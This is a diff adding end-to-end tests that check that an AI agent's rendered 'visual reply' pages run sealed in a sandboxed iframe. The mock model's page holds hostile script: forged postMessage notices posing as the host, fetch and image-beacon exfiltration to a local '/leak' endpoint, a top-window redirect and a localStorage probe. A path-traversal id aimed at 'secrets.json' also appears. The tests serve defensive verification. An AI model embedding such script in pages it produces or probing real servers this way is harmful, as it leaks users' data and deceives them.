@@ -20,6 +20,21 @@ const mock = await startMock(req => {
 		return '[{"type":"gotcha","text":"Proposed by the model after the run."}]';
 	}
 	const alreadyWrote = req.messages.some(m => m.role === 'tool');
+	// A visual reply: a page that draws something, then tries everything a hostile page would.
+	if (String(req.messages.filter(m => m.role === 'user').at(-1)?.content).includes('show a chart')) {
+		if (alreadyWrote) { return 'Here is the chart.'; }
+		const out = `http://127.0.0.1:${mock.port}`;
+		const html = `<!doctype html><html><body><h1 id="t">loading</h1><script>
+document.getElementById('t').textContent = 'chart ready';
+parent.postMessage({ type: 'info', message: 'FORGED BY PAGE' }, '*');
+parent.postMessage({ mj: 'toView', message: { type: 'info', message: 'FORGED VIA ENVELOPE' } }, '*');
+fetch('${out}/leak', { method: 'POST', body: JSON.stringify({ model: 'LEAK' }) }).catch(function () {});
+new Image().src = '${out}/leak.png';
+try { top.location = '${out}/top'; } catch (e) {}
+try { document.getElementById('t').dataset.storage = String(typeof localStorage.length); } catch (e) { document.getElementById('t').dataset.storage = 'denied'; }
+</scr` + `ipt></body></html>`;
+		return { text: 'Drawing it.', tool: { name: 'show_page', args: { title: 'Sales by month', html } } };
+	}
 	if (req.tools?.some(t => t.function?.name === 'write_file') && !alreadyWrote) {
 		return { text: 'Creating the file.', tool: { name: 'write_file', args: { path: 'hello.txt', content: 'hello from stormcoder\n' } } };
 	}
@@ -460,6 +475,38 @@ try {
 	await page.keyboard.press('Escape');
 	await page.click('[data-view=skills]');
 	await settings.locator('.area.active[data-area=skills]').getByText('Api Reviewer').first().waitFor({ timeout: 10000 });
+
+	// Visual replies: the agent shows a page. It renders, sealed: it cannot reach the network,
+	// the app's storage, the top window, or pass itself off as the host.
+	await page.click('[data-view=chat]');
+	await chat.locator('.tab-add').click();
+	await chat.locator('.chat-tab.active', { hasText: 'New chat' }).waitFor();
+	await chat.locator('.seg-btn[data-value=agent]').click();
+	await chat.locator('#input').fill('show a chart of sales');
+	await chat.locator('#input').press('Enter');
+	const shown = chat.locator('#messages > .message.page');
+	await shown.waitFor({ timeout: 20000 });
+	assert.equal((await shown.locator('.page-title').innerText()).trim(), 'Sales by month');
+	assert.equal(await shown.locator('iframe.page-frame').getAttribute('sandbox'), 'allow-scripts');
+	const inner = chat.frameLocator('iframe.page-frame').locator('#t');
+	await inner.getByText('chart ready').waitFor({ timeout: 10000 });
+	assert.equal(await inner.getAttribute('data-storage'), 'denied', 'the page has no storage of the app\'s');
+	await chat.getByText('Here is the chart.').first().waitFor({ timeout: 20000 });
+	await new Promise(r => setTimeout(r, 500));
+	assert.equal(await chat.getByText('FORGED').count(), 0, 'a page cannot speak as the host');
+	assert.ok(!seen.some(r => r.model === 'LEAK'), 'a page cannot send anything out');
+	assert.equal(new URL(page.url()).origin, new URL(url).origin, 'and cannot move the window');
+	const pageRequest = seen.find(r => r.tools?.some(t => t.function?.name === 'show_page'));
+	assert.ok(pageRequest, 'show_page is offered to the agent');
+	// The page is part of the transcript: it is there again after a reload.
+	await page.reload();
+	await page.frameLocator('#view-chat').locator('#messages > .message.page iframe.page-frame').waitFor({ timeout: 15000 });
+	// An unknown or malformed page id serves nothing of the app's.
+	for (const bad of ['0000000000000000', 'view', '..%2F..%2Fsecrets.json']) {
+		const res = await fetch(`${new URL(url).origin}/page/${bad}`);
+		assert.equal(res.status, 404, `page/${bad}`);
+		assert.match(res.headers.get('content-security-policy') ?? '', /sandbox allow-scripts; default-src 'none'/);
+	}
 
 	assert.deepEqual(errors, [], 'no uncaught page errors');
 	console.log('e2e: ok');
